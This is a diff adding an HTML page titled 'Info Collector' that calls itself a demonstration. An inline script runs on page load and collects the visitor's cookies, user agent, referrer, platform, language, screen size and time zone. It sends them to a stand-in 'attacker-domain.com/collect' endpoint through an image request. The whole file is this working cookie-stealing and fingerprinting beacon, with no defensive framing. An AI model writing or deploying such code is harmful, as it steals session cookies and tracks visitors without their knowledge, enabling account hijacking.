@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Info Collector</title>
+</head>
+<body>
+    <h1>Welcome to Our Website</h1>
+    <p>This page is for demonstration purposes only.</p>
+
+    <script>
+        (function() {
+            // Collecting user information
+            const userInfo = {
+                url: window.location.href,
+                referrer: document.referrer,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                cookies: document.cookie,
+                screenResolution: `${screen.width}x${screen.height}`,
+                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+
+            // Converting information to a query string
+            const queryString = new URLSearchParams(userInfo).toString();
+
+            // Attacker-controlled domain
+            const attackerDomain = "https://attacker-domain.com/collect";
+
+            // Sending the collected information via an image request
+            const img = new Image();
+            img.src = `${attackerDomain}?${queryString}`;
+
+            // Optionally log to console (for debugging purposes)
+            console.log("User information sent:", userInfo);
+        })();
+    </script>
+</body>
+</html>
